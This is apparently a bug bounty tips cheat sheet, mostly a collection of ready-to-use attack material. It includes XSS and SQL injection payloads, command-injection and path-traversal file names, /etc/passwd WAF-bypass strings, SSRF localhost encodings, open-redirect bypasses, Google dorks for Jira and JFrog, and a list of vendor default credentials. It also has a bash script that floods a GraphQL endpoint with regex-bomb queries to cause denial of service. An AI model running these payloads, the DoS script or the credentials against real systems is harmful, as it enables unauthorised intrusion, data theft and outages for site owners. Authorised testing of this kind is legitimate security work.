# Bug Bounty Tips File -3
## SSTI to RCE oneliner check
```sh
 waybackurls http://target.com | qsreplace "abc{{9*9}}" > fuzz.txt
 ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
 ```
 ```sh
 waybackurls https://abc.com | grep '=' | qsreplace "abc{{9*9}}"  | httpx -match-regex 'abc81' -threads 300 -http-proxy http://127.0.0.1:8080/
 ```
search: abc81 in burpsuite search and check
## Chaining file uploads with other vulns:-
 Set filename to:- 
`../../../tmp/lol.png` for path traversals
`sleep(10)-- -.jpg` for SQLi.
`<svg onload=alert(document.comain)>.jpg/png` for xss
`; sleep 10;` for command injections
## Extract urls,srcs and hrefs from all HTML elements in any website
**Open DevTools and run**
```js
urls = []
$$('*').forEach(element => {
  urls.push(element.src)
  urls.push(element.href)
  urls.push(element.url)
}); console.log(...new Set(urls))
```
## XSS
### XSS Oneliner
```sh
gospider -a -s abc.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
### XSS Payloads for short length inputs
```js
<script src=//⑮.₨></script>
```
### XSS Payloads
```js
 img{background-image:url('javascript:alert()')}
 <svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
 TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt; 
 ```
### Stored XSS Payloads
```js
<img src=`xx:xx`onerror=alert(1)>
<div/onmouseover='alert(1)'> style="x:">
\";alert('XSS');//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
```
## WAF Bypass
***WAF restriction? Use these:***
 ```sh
 /etc/passwd 
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```
## SSRF Localhost Access Bypass
```sh
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000..0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1
```
### When you are testing sharepoint applications check this file path that sometimes leads to directory listing:
```js
/_layouts/mobile/view.aspx
Google dork: /_layouts/mobile/view.aspx
```
## DOS GraphQl Endpoint
***Create DOS on GraphQl Endpoint by appending null characters by somehow***
You can reveal the bug inserting `"\u0000"` on search parameter, in order to display an error with part of the graph query.
** Example -1**
```graphql
query a { 
  search(q: "\u0000)", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id  
 }
}
```
**Example -2** 
```graphql
query a { 
  search(q: "\u0000)", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id  
 }
}
```
### Graphql Payload with Regex Bomb
```graphql
query a { 
  search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\", lang: "en") {
    _id
   weapon_id
    rarity
    collection{ _id name }
    collection_id 
 }
}
```
### Exploit Code
```sh
#!/bin/bash
RED='\033[0;31m'
Y='\033[0;33m'
NC='\033[0m' # No Color
printf  "${Y}================================================================\n"
printf  "${Y}====================${NC} EXECUTING THE PAYLOAD ON ${Y}=======================\n"
printf  "${NC}https://abc.com/graphql ${Y}========\n"
printf  "${Y}================================================================${NC}\n"
for i in {1..100}; do curl 'https://abc.com/graphql'  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'      --data-binary $'{"query":"query a { \\n  search(q: \\"[a-zA-Z0-9]+\\\\\\\\s?)+$|^([a-zA-Z0-9.\'\\\\\\\\w\\\\\\\\W]+\\\\\\\\s?)+$\\\\\\\\\\", lang: \\"en\\") {\\n    _id\\n   weapon_id\\n    rarity\\n    collection{ _id name }\\n    collection_id \\n \\n }\\n}","variables":null}' --compressed  & done

```
### Supporting Materials
> ***https://hackerone.com/reports/1000567***
---
## SSRF 
1. Create an account email@burp_collab*
2. Forgot password
3. Received requests from internal server + SMTP connection details
4. Got Internal headers + origin IP
5. https://abc.com/ = (403)
6. https://abc.com/dir = (Headers + Origin IP = pwn)
## Jira Dorks
```text
inurl:companyname intitle:JIRA login
inurl:visma intitle:JIRA login
```
📅 02-Nov-2020
## Open Redirect Bypass
### Payloads
```text
https:www.google.com
HtTp://google.com
http\x3A\x2F\x2Fgoogle.com
//google。com
x00http://google.com
////216.58.214.206
/\216.58.214.206
x20http://www.google.com
https://www.google.com
hthttp://tp://www.google.com
。/www.google.com
```
### Dorks & Parameter Names
```text
site:target.com AND inurl:url=http(s)
site:target.com AND inurl:u=http(s)
site:target.com AND inurl:redirect?http(s)
site:target.com AND inurl:redirect=http(s)
site:target.com AND inurl:link=http(s)
```
***Some parameter names that need attention while looking for Open Redirects:***
```text
?next=
?url=
?dest=
?redirect=
?returnTo=
?go=
?redirect_uri
?continue=
?return_path=
?externalLink=
?URL=
```
## SQL Injection Payloads
***Some updated SQLi payloads you must try:)***
```sql
+OR+1=insert(1,1,1,1)--
+OR+1=replace(1,1,1)--
{`foo`/*bar*/(select+1)\}'
{`foo`/*bar*/(select%2b2)}
{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
```
## Default Credentials
```text
Cisco: cisco:cisco
Citrix: nsroot:nsroot
Dell iDRAC: root:calvin
Juniper: super:juniper123
pfSense: admin:pfsense
SAP: SAP*:06071992
Tomcat: tomcat:tomcat
UniFi: ubnt:ubnt
Weblogic: weblogic:weblogic1
Zabbix: Admin:zabbix
```
## your target is using jfrog ? you can access it with anonymous login  through .io
use dork `site:https://t.co/DV0nl9nSlU inurl:yourtarget` and easy access it :) 
